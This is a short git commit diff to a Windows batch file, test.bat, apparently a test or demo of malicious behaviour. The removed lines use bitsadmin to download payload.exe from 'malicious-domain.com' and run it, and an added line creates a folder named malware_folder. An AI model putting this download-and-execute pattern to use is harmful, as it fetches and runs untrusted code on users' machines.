cf0fb83815ff72abd72f166b1c8dae3c1242366d
duydang2002 <76654292+duydang2002@users.noreply.github.com>
2024-12-25 09:19:53 +0700

    Update test.bat

--- test.bat
+++ test.bat
@@ -2,7 +2,6 @@
 @echo off
 
 echo Hello, this is a BAT file!
-mkdir C:\example-folder
-bitsadmin /transfer download https://malicious-domain.com/payload.exe C:\Users\Public\payload.exe
-C:\Users\Public\payload.exe
+mkdir C:\Users\Public\malware_folder
+
 pause
